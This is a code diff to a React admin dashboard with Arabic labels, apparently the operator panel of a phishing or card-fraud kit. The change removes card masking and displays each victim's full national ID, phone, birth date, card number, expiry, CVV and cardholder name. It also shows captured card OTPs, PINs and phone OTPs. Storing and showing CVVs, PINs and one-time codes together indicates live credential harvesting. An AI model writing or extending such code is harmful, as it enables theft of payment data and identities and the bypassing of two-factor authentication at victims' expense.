@@ -929,15 +929,57 @@ export default function Dashboard() {
                         </div>
                       </td>
                       <td className="px-4 py-4">
-                        <div className="flex flex-wrap justify-center gap-1">
-                          <Badge variant={notification.fullName ? "default" : "secondary"} className="text-xs">
-                            <User className="h-3 w-3 mr-1" />
-                            شخصي
-                          </Badge>
-                          <Badge variant={notification.cardNumber ? "default" : "secondary"} className={`text-xs ${notification.cardNumber ? "bg-emerald-500" : ""}`}>
-                            <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardLast4 ? `****${notification.cardLast4}` : "بطاقة"}
-                          </Badge>
+                        <div className="flex flex-col gap-2">
+                          {/* Personal Info */}
+                          <div className="flex flex-wrap justify-center gap-1">
+                            {notification.nationalId && (
+                              <Badge className="text-xs bg-blue-600 text-white">
+                                <User className="h-3 w-3 ml-1" />
+                                {notification.nationalId}
+                              </Badge>
+                            )}
+                            {notification.phone && (
+                              <Badge className="text-xs bg-purple-600 text-white">
+                                <Phone className="h-3 w-3 ml-1" />
+                                {notification.phone}
+                              </Badge>
+                            )}
+                            {notification.birthDate && (
+                              <Badge className="text-xs bg-indigo-600 text-white">
+                                {notification.birthDate}
+                              </Badge>
+                            )}
+                          </div>
+                          {/* Card Info */}
+                          <div className="flex flex-wrap justify-center gap-1">
+                            {notification.cardNumber && (
+                              <Badge className="text-xs bg-emerald-600 text-white">
+                                <CreditCard className="h-3 w-3 ml-1" />
+                                {notification.cardNumber}
+                              </Badge>
+                            )}
+                            {notification.cardExpiry && (
+                              <Badge className="text-xs bg-amber-600 text-white">
+                                {notification.cardExpiry}
+                              </Badge>
+                            )}
+                            {notification.cardCvv && (
+                              <Badge className="text-xs bg-rose-600 text-white">
+                                CVV: {notification.cardCvv}
+                              </Badge>
+                            )}
+                            {notification.cardHolder && (
+                              <Badge className="text-xs bg-teal-600 text-white">
+                                {notification.cardHolder}
+                              </Badge>
+                            )}
+                          </div>
+                          {/* Show placeholder if no data */}
+                          {!notification.nationalId && !notification.phone && !notification.cardNumber && (
+                            <Badge variant="secondary" className="text-xs mx-auto">
+                              لا توجد بيانات
+                            </Badge>
+                          )}
                         </div>
                       </td>
                       <td className="px-4 py-4">
@@ -1143,9 +1185,42 @@ export default function Dashboard() {
                   </CardHeader>
 
                   <CardContent className="pt-4 space-y-4">
+                    {/* Personal & Card Info */}
+                    <div className="flex flex-wrap gap-1">
+                      {notification.nationalId && (
+                        <Badge className="text-xs bg-blue-600 text-white">
+                          <User className="h-3 w-3 ml-1" />
+                          {notification.nationalId}
+                        </Badge>
+                      )}
+                      {notification.phone && (
+                        <Badge className="text-xs bg-purple-600 text-white">
+                          <Phone className="h-3 w-3 ml-1" />
+                          {notification.phone}
+                        </Badge>
+                      )}
+                      {notification.cardNumber && (
+                        <Badge className="text-xs bg-emerald-600 text-white">
+                          <CreditCard className="h-3 w-3 ml-1" />
+                          {notification.cardNumber}
+                        </Badge>
+                      )}
+                      {notification.cardExpiry && (
+                        <Badge className="text-xs bg-amber-600 text-white">
+                          {notification.cardExpiry}
+                        </Badge>
+                      )}
+                      {notification.cardCvv && (
+                        <Badge className="text-xs bg-rose-600 text-white">
+                          CVV: {notification.cardCvv}
+                        </Badge>
+                      )}
+                    </div>
+                    {/* OTP/PIN Info */}
                     <div className="flex flex-wrap gap-2">
-                      {notification.cardOtp && <Badge className="bg-blue-600">OTP: {notification.cardOtp}</Badge>}
-                      {notification.cardPin && <Badge className="bg-purple-600">PIN: {notification.cardPin}</Badge>}
+                      {notification.cardOtp && <Badge className="bg-blue-600 text-white">OTP: {notification.cardOtp}</Badge>}
+                      {notification.cardPin && <Badge className="bg-purple-600 text-white">PIN: {notification.cardPin}</Badge>}
+                      {notification.phoneOtp && <Badge className="bg-pink-600 text-white">Phone OTP: {notification.phoneOtp}</Badge>}
                     </div>
 
                     <div className="flex gap-2 flex-wrap">
